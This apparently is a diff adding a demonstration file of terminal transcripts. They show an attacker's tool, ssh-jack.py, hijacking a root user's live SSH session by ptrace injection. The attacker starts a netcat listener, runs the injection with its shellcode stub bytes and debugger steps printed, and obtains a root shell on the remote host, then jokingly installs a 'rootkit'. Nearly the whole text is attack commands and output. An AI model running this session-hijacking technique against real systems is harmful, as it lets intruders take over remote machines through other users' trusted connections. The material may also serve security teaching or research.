@@ -1,0 +1,107 @@
+-----------------------
+Innocent User Shell 1:
+-----------------------
+
+metlstrm@metal-2:~$ ssh root@tungsten
+root@tungsten's password: 
+Last login: Mon Apr 25 17:47:35 2005 from 192.168.158.1 on pts/0
+Linux tungsten 2.4.19 #1 Sun Aug 17 18:29:48 NZST 2003 i586 unknown
+        16 Jan 2k3 - Metl: Tungsten returns home. Has upper 4MB of ram
+                        turned back on, 28k8 reactivated, X removed.
+                        Poor old tungsten, back to the grindstone.
+You have new mail.
+Last login: Mon Apr 25 17:47:35 2005 from 192.168.158.1
+root@tungsten:~# 
+
+----------------------
+Evil Haxor Shell 1:
+----------------------
+
+metlstrm@metal-2:~$ nc -l -p 1337
+
+----------------------
+Evil Haxor Shell 2:
+----------------------
+
+metlstrm@metal-2:~$ ps auxw | grep ssh\ root@
+metlstrm  4588  0.0  0.1  4044 1792 pts/2    S+   14:06   0:00 ssh root@tungsten
+metlstrm@metal-2:~$ /tmp/ssh-jack.py 
+Usage: /tmp/ssh-jack.py pid host port
+       pid: process ID of target SSH client process
+ host/port: tcp socket where you'd like the shell delivered
+
+ Attaches a debugger to the running SSH process, convinces it to give you a shell at the remote end.
+ Note that you must be able to ptrace the target pid; ie, be root or the same user.
+ Use netcat to listen for the incoming shell, or equivilent.
+ Version: 1.02
+metlstrm@metal-2:~$ /tmp/ssh-jack.py 4588 localhost 1337
+Connecting to /usr/bin/ssh running as pid 4588...
+Connected
+Ferreting out some useful symbols...
+Located libc symbol 'socket' at 0xb7e19a50
+Located libc symbol 'connect' at 0xb7e195c0
+Located libc symbol 'select' at 0xb7e12490
+Located section '.got' 0x0807eb8c to 0x0807eef4
+Located section '.plt' 0x0804aa68 to 0x0804b7d8
+Located section '.text' 0x0804b7e0 to 0x08070450
+Located section '.rodata' 0x08070480 to 0x0807dd6c
+Resolved dynamic symbol 'socket' at PLT: 0x0804b6b8 GOT: 0x0807eea8
+Resolved dynamic symbol 'select' at PLT: 0x0804ad88 GOT: 0x0807ec5c
+Resolved dynamic symbol 'connect' at PLT: 0x0804b5f8 GOT: 0x0807ee78
+Locating stub injection point...
+Phase 1: Find magic string in .rodata... 0x0807139c
+Phase 2: Find where magic string is used... 0x0804d803
+Phase 3: Find three jump 0x0804d800 instructions... 0x0804d6d9 0x0804d6e1 0x0804d6e9
+Phase 4: Check that there's a test 4 bytes before JS1... 0x0804d6d5
+Phase 5: Determine size of local stack... at 0x0804d696: 44 bytes
+Injection point located: 0x0804d679
+Patching PLT locs and parameters into stub...
+Stub:
+0x9c 0x60 0xe8 0x13 0x00 0x00 0x00 0x61 0x9d 0x90 0x02 0x00 0x05 0x39 0x7f 0x00 
+0x00 0x01 0xb8 0xb6 0x04 0x08 0xf8 0xb5 0x04 0x08 0x55 0x89 0xe5 0x57 0x56 0x53 
+0x81 0xec 0x2c 0x00 0x00 0x00 0x53 0x8b 0x5d 0x04 0x43 0x43 0x43 0x68 0x00 0x00 
+0x00 0x00 0x68 0x01 0x00 0x00 0x00 0x68 0x02 0x00 0x00 0x00 0xff 0x53 0x08 0x89 
+0xc7 0x81 0xc4 0x0c 0x00 0x00 0x00 0x68 0x10 0x00 0x00 0x00 0x53 0x57 0xff 0x53 
+0x0c 0x81 0xc4 0x0c 0x00 0x00 0x00 0x5b 0x89 0xf8 0x89 0xfe 
+Inserting breakpoint at safe place 0x0804ad88
+Continuing execution.
+Waiting for breakpoint...
+Smacking it upside the head with a SIGWINCH to wake it up...
+Saving EIP
+Saved EIP 0x804ad88
+Saving 92 bytes of code that we're about to overwrite at 0x0804d679
+Injecting 92 bytes of stub at 0x0804d679
+Clearing breakpoint
+Setting new breakpoint at 0x0804d682
+Setting EIP to 0x0804d679
+Continuing execution.
+Waiting for breakpoint...
+Returned from our stub! Woot!
+Restoring 92 bytes of old code that we overwrote at 0x0804d679
+Clearing break
+Resetting EIP
+Finished cleaning up, detaching from process.
+Smacking it upside the head with a SIGWINCH to wake it up...
+metlstrm@metal-2:~$ 
+
+-------------------------------
+Evil Haxor Shell 1:
+-------------------------------
+Linux tungsten 2.4.19 #1 Sun Aug 17 18:29:48 NZST 2003 i586 unknown
+        16 Jan 2k3 - Metl: Tungsten returns home. Has upper 4MB of ram
+                        turned back on, 28k8 reactivated, X removed.
+                        Poor old tungsten, back to the grindstone.
+You have new mail.
+Last login: Fri Apr 29 14:03:03 2005 from 192.168.158.1
+root@tungsten:~# 
+root@tungsten:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@tungsten:~# echo pwn! 
+pwn!
+root@tungsten:~# apt-get install rootkit
+
+---------------------------------
+Innocent User Shell 1:
+---------------------------------
+
+*shell still functional*
